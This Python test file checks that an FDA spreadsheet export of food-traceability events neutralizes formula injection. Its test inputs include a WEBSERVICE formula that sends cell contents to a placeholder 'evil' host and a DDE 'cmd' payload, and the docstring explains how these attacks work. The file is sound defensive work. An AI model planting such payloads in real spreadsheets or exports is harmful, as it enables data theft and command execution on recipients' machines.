"""Formula-injection coverage for the EPCIS FDA-spreadsheet export.

``export_fda`` in ``app/epcis_export.py`` renders tenant-controlled event
fields (lot codes, locations, carriers) into a CSV download. Ingested CSV
cells are stored raw, so any field that reaches this export without
passing through ``sanitize_cell`` becomes a live spreadsheet formula on
the recipient's machine (``=WEBSERVICE(...)`` exfiltrates neighboring
cells, ``=cmd|...`` targets older Excel). ``_fda_csv_row`` must
neutralize every cell, matching the ``_event_to_fda_row`` posture in
``fda_export_service.py``.
"""

import sys
from pathlib import Path

_ingestion_dir = Path(__file__).resolve().parent.parent
if str(_ingestion_dir) not in sys.path:
    sys.path.insert(0, str(_ingestion_dir))

_services_dir = _ingestion_dir.parent
if str(_services_dir) not in sys.path:
    sys.path.insert(0, str(_services_dir))

from app.epcis_export import _fda_csv_row  # noqa: E402


def _row(**overrides):
    """A benign tenant event row shaped like ``_query_tenant_events`` output."""
    row = {
        "event_type": "shipping",
        "traceability_lot_code": "TOM-0226-F3-001",
        "product_description": "Roma Tomatoes 12ct",
        "quantity": 200,
        "unit_of_measure": "cases",
        "event_timestamp": None,
        "location_gln": "0614141000005",
        "location_name": "Valley Fresh Farms",
        "sha256_hash": "a3f8c1d2e4b5",
        "ship_from": "Valley Fresh Farms Salinas CA",
        "ship_from_gln": "0614141000005",
        "ship_to": "Metro Distribution Center LA",
        "ship_to_gln": "0614141000012",
        "carrier": "Cold Express Logistics",
        "temperature_c": 3.2,
    }
    row.update(overrides)
    return row


def _cells(line):
    return line.split(",")


class TestFdaCsvRowNeutralizesFormulas:
    def test_crafted_lot_code_is_neutralized(self):
        line = _fda_csv_row(
            _row(traceability_lot_code='=WEBSERVICE("http://evil/?x="&A1)'),
            "2026-02-26",
            "14:30:00Z",
        )
        assert "'=WEBSERVICE(" in _cells(line)[1]
        assert "\n=WEBSERVICE" not in line

    def test_every_previously_raw_column_is_neutralized(self):
        line = _fda_csv_row(
            _row(
                event_type="=2+5+cmd",
                traceability_lot_code="=cmd|' /C calc'!A0",
                quantity="=1+1",
                unit_of_measure="@SUM(1+1)",
                ship_from_gln="+1+cmd",
                ship_to_gln="-2-cmd",
                temperature_c="-1.5",
                sha256_hash="=abc123",
            ),
            "2026-02-26",
            "14:30:00Z",
        )
        cells = _cells(line)
        assert cells[0] == "'=2+5+CMD"
        assert cells[1] == "'=cmd|' /C calc'!A0"
        assert cells[3] == "'=1+1"
        assert cells[4] == "'@SUM(1+1)"
        assert cells[8] == "'+1+cmd"
        assert cells[10] == "'-2-cmd"
        assert cells[12] == "'-1.5"
        assert cells[13] == "'=abc123"

    def test_no_output_cell_starts_with_dangerous_prefix(self):
        line = _fda_csv_row(
            _row(
                traceability_lot_code="=evil",
                product_description="+evil",
                unit_of_measure="-evil",
                carrier="@evil",
                ship_to="\revil",
                ship_from="\tevil",
            ),
            "2026-02-26",
            "14:30:00Z",
        )
        for cell in _cells(line):
            assert not cell[:1] in ("=", "+", "-", "@", "\t", "\r"), cell


class TestFdaCsvRowPreservesBenignValues:
    def test_safe_values_pass_through_unchanged(self):
        line = _fda_csv_row(_row(), "2026-02-26", "14:30:00Z")
        assert line == (
            "SHIPPING,TOM-0226-F3-001,Roma Tomatoes 12ct,200,cases,"
            "2026-02-26,14:30:00Z,"
            "Valley Fresh Farms Salinas CA,0614141000005,"
            "Metro Distribution Center LA,0614141000012,"
            "Cold Express Logistics,3.2,a3f8c1d2e4b5"
        )

    def test_commas_in_values_do_not_break_columns(self):
        line = _fda_csv_row(
            _row(product_description="Salad, Mix", ship_to="Metro, LA"),
            "2026-02-26",
            "14:30:00Z",
        )
        assert len(_cells(line)) == 14
        assert "Salad; Mix" in line
        assert "Metro; LA" in line

    def test_missing_values_render_empty(self):
        line = _fda_csv_row({}, "", "")
        assert line == ",".join([""] * 14)
